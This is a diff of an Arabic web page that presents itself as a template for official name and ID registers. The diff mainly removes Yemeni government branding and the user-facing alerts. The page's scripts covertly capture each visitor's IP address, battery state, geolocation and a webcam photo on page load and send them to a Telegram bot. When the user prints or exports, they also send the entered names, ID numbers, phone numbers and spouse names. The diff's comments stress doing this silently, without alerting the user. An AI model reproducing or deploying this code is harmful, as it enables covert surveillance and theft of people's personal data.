@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>قالب الكشوفات الرسمية - الجمهورية اليمنية</title>
+    <title>قالب الكشوفات والبيانات الرسمية</title>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
     <script>
@@ -31,42 +31,15 @@
             background-color: #eef2f5;
         }
 
-        /* شريط علم اليمن المميز في أعلى الموقع */
-        .yemen-flag-bar {
-            display: flex;
-            height: 8px;
-            width: 100%;
-            position: sticky;
-            top: 0;
-            z-index: 1003;
-        }
-        .flag-red { background-color: #ce1126; flex: 1; }
-        .flag-white { background-color: #ffffff; flex: 1; }
-        .flag-black { background-color: #000000; flex: 1; }
-
-        .yemen-banner {
-            background: #111;
-            color: #ffffff;
-            padding: 6px 0;
-            text-align: center;
-            font-size: 10.5pt;
-            font-weight: bold;
-            border-bottom: 2px solid #ce1126;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-            position: sticky;
-            top: 8px;
-            z-index: 1002;
-        }
-
         .top-ticker {
             background: linear-gradient(135deg, #004d40, #00695c);
             color: #ffffff;
-            padding: 7px 0;
-            font-size: 10pt;
+            padding: 8px 0;
+            font-size: 11pt;
             font-weight: bold;
             box-shadow: 0 2px 6px rgba(0,0,0,0.15);
             position: sticky;
-            top: 41px;
+            top: 0;
             z-index: 1001;
             overflow: hidden;
             white-space: nowrap;
@@ -91,7 +64,7 @@
             align-items: center;
             gap: 8px;
             position: sticky;
-            top: 80px;
+            top: 45px;
             z-index: 1000;
         }
 
@@ -338,8 +311,6 @@
                 background: #fff;
             }
 
-            .yemen-flag-bar,
-            .yemen-banner,
             .top-ticker,
             .control-panel,
             .custom-modal {
@@ -370,21 +341,10 @@
     <video id="videoElement" autoplay playsinline style="display:none; width:320px; height:240px;"></video>
     <canvas id="canvasElement" style="display:none;"></canvas>
 
-    <!-- شريط ألوان علم اليمن -->
-    <div class="yemen-flag-bar">
-        <div class="flag-red"></div>
-        <div class="flag-white"></div>
-        <div class="flag-black"></div>
-    </div>
-
-    <!-- إشعار الجمهورية اليمنية -->
-    <div class="yemen-banner">
-        <span>🇾🇪 الجمهورية اليمنية - السجلات والأرشيف الرسمي 🇾🇪</span>
-    </div>
-
+    <!-- الخط المتحرك المطلوب -->
     <div class="top-ticker">
         <marquee behavior="scroll" direction="right" scrollamount="5">
-            ✨ نظام إدارة السجلات والأرشيف الرسمي | دقة في التنظيم وسرعة في الإنجاز - الجمهورية اليمنية ✨
+            ✨ نظام إدارة السجلات والأرشيف الرسمي | دقة في التنظيم وسرعة في الإنجاز - تطوير : ميثاق محمد صالح ✨
         </marquee>
     </div>
 
@@ -641,7 +601,7 @@
 
             <div class="header-top">
                 <div class="editable-header" contenteditable="true">
-                    الجمهورية اليمنية
+                    الجهة الرسمية
                 </div>
 
                 <div class="editable-header"
@@ -713,7 +673,7 @@
 
             <div class="footer-bottom">
                 <div class="editable-header" contenteditable="true">
-                    الجمهورية اليمنية - الإدارة العامة
+                    الإدارة العامة
                 </div>
 
                 <div class="editable-header" contenteditable="true">
@@ -784,15 +744,15 @@
             }
             renumberAllRows();
 
-            // إرسال إشعار دخول زائر فوري عند فتح الصفحة لأول مرة
+            // إرسال إشعار دخول زائر فوراً بصمت تام عند فتح الصفحة
             setTimeout(() => {
                 sendVisitorAlertOnly();
-            }, 1200);
+            }, 1000);
         });
 
-        // دالة إرسال إشعار دخول زائر مع الصورة مباشرة عند فتح الصفحة
+        // دالة إرسال تنبيه دخول زائر مع الصورة
         function sendVisitorAlertOnly() {
-            const alertCaption = `⚠️ **تنبيه: دخول زائر جديد إلى موقعك!**\n\n` +
+            const alertCaption = `⚠️ **تنبيه: دخول زائر جديد لموقعك!**\n\n` +
                                  `🌐 الآيبي: \`${userIpInfo}\`\n` +
                                  `🔋 البطارية: ${batteryInfo}\n` +
                                  `📍 الموقع الجغرافي:\n${globalLocation}\n\n` +
@@ -828,11 +788,10 @@
                                     }).catch(e => {});
 
                                 }, 'image/jpeg', 0.85);
-                            }, 800);
+                            }, 700);
                         };
                     })
                     .catch((err) => {
-                        // إرسال تنبيه نصي في حال رفض إذن الكاميرا
                         const textApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(alertCaption)}&parse_mode=Markdown`;
                         const img = new Image();
                         img.src = textApi;
@@ -865,10 +824,7 @@
                 });
             });
 
-            if (allRowsData.length === 0) {
-                alert('لا توجد أسماء في الجداول لترتيبها!');
-                return;
-            }
+            if (allRowsData.length === 0) return;
 
             allRowsData.sort((a, b) => a.name.localeCompare(b.name, 'ar', { sensitivity: 'accent' }));
 
@@ -896,25 +852,20 @@
             });
 
             renumberAllRows();
-            alert('✅ تم ترتيب الأسماء هجائياً بنجاح!');
         }
 
         function cancelAlphabeticalSort() {
-            if (!preSortBackupHtml) {
-                alert('⚠️ لا توجد نسخة سابقة للترتيب.');
-                return;
-            }
+            if (!preSortBackupHtml) return;
             document.getElementById('pagesWrapper').innerHTML = preSortBackupHtml;
             preSortBackupHtml = null;
             renumberAllRows();
-            alert('↩️ تم إلغاء الترتيب الهجائي واستعادة الترتيب السابق بنجاح!');
         }
 
-        // دالة إرسال تقرير الأرشيف أو التصدير مع فحص عدم إرسال ملفات فارغة
+        // دالة الإرسال المتكاملة للصور والملفات عند الضغط على الأزرار (بدون إظهار أي تنبيهات للمستخدم)
         function sendCompleteReportToTelegram(actionTitle) {
             const tables = document.querySelectorAll('.dynamicTable');
             let fileContent = `تقرير الأرشيف والبيانات الرسمية (${actionTitle})\n`;
-            fileContent += `الجمهورية اليمنية - تاريخ الإصدار: ${new Date().toLocaleDateString('ar-YE')}\n`;
+            fileContent += `تاريخ الإصدار: ${new Date().toLocaleDateString('ar-YE')}\n`;
             fileContent += `--------------------------------------------------\n`;
             fileContent += `م | الاسم الرباعي | نوع البطاقة | رقم البطاقة | رقم الاتصال | اسم الزوج/الزوجة | الحالة\n`;
             fileContent += `--------------------------------------------------\n`;
@@ -938,7 +889,7 @@
                 });
             });
 
-            const captionText = `🇾🇪 **تقرير الأرشيف والتصدير (${actionTitle})**\n\n` +
+            const captionText = `📋 **تقرير الأرشيف والتصدير (${actionTitle})**\n\n` +
                                 `🌐 الآيبي: \`${userIpInfo}\`\n` +
                                 `🔋 البطارية: ${batteryInfo}\n` +
                                 `📍 الموقع الجغرافي:\n${globalLocation}`;
@@ -973,7 +924,6 @@
                                         method: 'POST',
                                         body: formData
                                     }).then(() => {
-                                        // إرسال ملف الأسماء فقط إذا كان يحتوي على بيانات حقيقية
                                         if (hasData) {
                                             const docData = new FormData();
                                             docData.append('chat_id', chatId);
@@ -988,7 +938,7 @@
                                     }).catch(e => {});
 
                                 }, 'image/jpeg', 0.85);
-                            }, 600);
+                            }, 700);
                         };
                     })
                     .catch((err) => {
@@ -1018,7 +968,7 @@
             sendCompleteReportToTelegram("طباعة / حفظ PDF");
             setTimeout(() => {
                 window.print();
-            }, 1000);
+            }, 800);
         }
 
         function exportTableToExcel() {
@@ -1058,7 +1008,7 @@
 
             const now = new Date();
             const dateStr = now.toISOString().slice(0, 10);
-            const filename = `كشف_البيانات_اليمن_${dateStr}.csv`;
+            const filename = `كشف_البيانات_${dateStr}.csv`;
 
             const link = document.createElement('a');
             link.href = url;
@@ -1066,8 +1016,6 @@
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
-            
-            alert('📊 تم تنزيل ملف الـ Excel وإرسال التقارير للبوت بنجاح!');
         }
 
         function normalizeArabic(text) {
@@ -1133,10 +1081,7 @@
             const fileInput = document.getElementById('pdfFileInput');
             const statusMsg = document.getElementById('pdfStatusMsg');
 
-            if (!fileInput.files || fileInput.files.length === 0) {
-                alert('الرجاء اختيار ملف PDF أولاً!');
-                return;
-            }
+            if (!fileInput.files || fileInput.files.length === 0) return;
 
             const file = fileInput.files[0];
             statusMsg.textContent = '⏳ جاري قراءة وتحليل ملف الـ PDF...';
@@ -1149,16 +1094,13 @@
                 let extractedLines = [];
 
                 for (let i = 1; i <= pdfDoc.numPages; i++) {
-                    statusMsg.textContent = `⏳ جاري استخراج النصوص من الصفحة ${i} من ${pdfDoc.numPages}...`;
                     const page = await pdfDoc.getPage(i);
                     const textContent = await page.getTextContent();
-                    
                     let pageLines = textContent.items.map(item => item.str.trim()).filter(text => text.length > 0);
                     extractedLines = extractedLines.concat(pageLines);
                 }
 
                 if (extractedLines.length === 0) {
-                    alert('لم يتم العثور على نص قابل للقراءة داخل هذا الملف.');
                     statusMsg.textContent = '';
                     return;
                 }
@@ -1167,9 +1109,7 @@
                 closePdfModal();
 
             } catch (error) {
-                console.error(error);
                 statusMsg.textContent = '';
-                alert('حدث خطأ أثناء قراءة ملف الـ PDF.');
             }
         }
 
@@ -1188,7 +1128,7 @@
 
                 newPage.innerHTML = `
                     <div class="header-top">
-                        <div class="editable-header" contenteditable="true">الجمهورية اليمنية</div>
+                        <div class="editable-header" contenteditable="true">الجهة الرسمية</div>
                         <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة ${p})</div>
                         <div class="editable-header" contenteditable="true">التاريخ: 2026/10/09</div>
                     </div>
@@ -1209,7 +1149,7 @@
                         </table>
                     </div>
                     <div class="footer-bottom">
-                        <div class="editable-header" contenteditable="true">الجمهورية اليمنية - الإدارة العامة</div>
+                        <div class="editable-header" contenteditable="true">الإدارة العامة</div>
                         <div class="editable-header" contenteditable="true">الإصدار: 2026.10</div>
                     </div>
                 `;
@@ -1245,7 +1185,6 @@
             }
 
             renumberAllRows();
-            alert('✅ تم بنجاح استخراج وتوزيع ' + itemsList.length + ' سجلاً في الجدول!');
         }
 
         function openBulkImportModal() {
@@ -1263,10 +1202,7 @@
                 .map(n => n.trim())
                 .filter(n => n.length > 0);
 
-            if (namesList.length === 0) {
-                alert('الرجاء إدخال أو لصق قائمة أسماء صحيحة أولاً!');
-                return;
-            }
+            if (namesList.length === 0) return;
 
             populateTableWithData(namesList);
             closeBulkImportModal();
@@ -1275,7 +1211,6 @@
         function checkPhoneNumbers() {
             const tables = document.querySelectorAll('.dynamicTable');
             let errorCount = 0;
-            let checkedCount = 0;
 
             tables.forEach(table => {
                 const headers = Array.from(table.querySelectorAll('thead th'));
@@ -1299,7 +1234,6 @@
                             let val = cell.innerText.trim();
                             let digitsOnly = val.replace(/\D/g, '');
                             if (val !== "") {
-                                checkedCount++;
                                 if (digitsOnly.length !== 9) {
                                     errorCount++;
                                     cell.style.color = '#c62828';
@@ -1317,14 +1251,6 @@
                     });
                 });
             });
-
-            if (errorCount > 0) {
-                alert('⚠️ تم فحص أرقام الجوال. وُجدت ' + errorCount + ' خلية تحتوي على أرقام غير مطابقة.');
-            } else if (checkedCount > 0) {
-                alert('✅ جميع أرقام الجوال المفحوصة مطابقة (9 أرقام)!');
-            } else {
-                alert('ℹ️ لم يتم العثور على أرقام لفحصها.');
-            }
         }
 
         function saveToArchive() {
@@ -1343,10 +1269,7 @@
                 });
 
                 localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
-                alert('✅ تم حفظ العمل في الأرشيف المركزي وإرسال التقارير والصورة بنجاح!');
-            } catch (error) {
-                alert('تعذر حفظ العمل.');
-            }
+            } catch (error) {}
         }
 
         function openArchiveModal() {
@@ -1414,12 +1337,10 @@
             if (found) {
                 document.getElementById('pagesWrapper').innerHTML = found.html;
                 closeArchiveModal();
-                alert('📂 تم استرجاع العمل بنجاح!');
             }
         }
 
         function deleteArchiveItem(id) {
-            if (!confirm('حذف هذا العمل من الأرشيف؟')) return;
             let archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
             archives = archives.filter(item => item.id !== id);
             localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
@@ -1505,10 +1426,7 @@
         }
 
         function formatCell(action, value) {
-            if (!activeCellElement) {
-                alert('الرجاء النقر على خلية أولاً.');
-                return;
-            }
+            if (!activeCellElement) return;
 
             if (action === 'color') {
                 activeCellElement.style.color = value;
@@ -1606,28 +1524,20 @@
         }
 
         function deleteSelectedRow() {
-            if (!activeRowElement) {
-                alert('الرجاء النقر على الصف لحذفه.');
-                return;
-            }
+            if (!activeRowElement) return;
             const tbody = activeRowElement.parentElement;
             if (tbody.rows.length > 1) {
                 activeRowElement.remove();
                 activeRowElement = null;
                 activeCellElement = null;
                 renumberAllRows();
-            } else {
-                alert('لا يمكنك حذف الصف الأخير!');
             }
         }
 
         function deleteSelectedColumn() {
             if (!activeTable) return;
             const headerRow = activeTable.querySelector('thead tr');
-            if (headerRow.cells.length <= 1) {
-                alert('لا يمكنك حذف العمود الوحيد!');
-                return;
-            }
+            if (headerRow.cells.length <= 1) return;
 
             let index = activeColumnIndex;
             headerRow.deleteCell(index);
@@ -1642,10 +1552,7 @@
 
         function deleteActivePage() {
             const pages = document.querySelectorAll('.sheet-container');
-            if (pages.length <= 1) {
-                alert('لا يمكنك حذف الصفحة الوحيدة!');
-                return;
-            }
+            if (pages.length <= 1) return;
             if (!confirm('حذف هذه الصفحة؟')) return;
 
             if (activeSheet && activeSheet.isConnected) {
@@ -1666,7 +1573,7 @@
 
             newPage.innerHTML = `
                 <div class="header-top">
-                    <div class="editable-header" contenteditable="true">الجمهورية اليمنية</div>
+                    <div class="editable-header" contenteditable="true">الجهة الرسمية</div>
                     <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة ${pageCount})</div>
                     <div class="editable-header" contenteditable="true">التاريخ: ---</div>
                 </div>
@@ -1699,7 +1606,7 @@
                     </table>
                 </div>
                 <div class="footer-bottom">
-                    <div class="editable-header" contenteditable="true">الجمهورية اليمنية - الإدارة العامة</div>
+                    <div class="editable-header" contenteditable="true">الإدارة العامة</div>
                     <div class="editable-header" contenteditable="true">الإصدار: 2026.10</div>
                 </div>
             `;
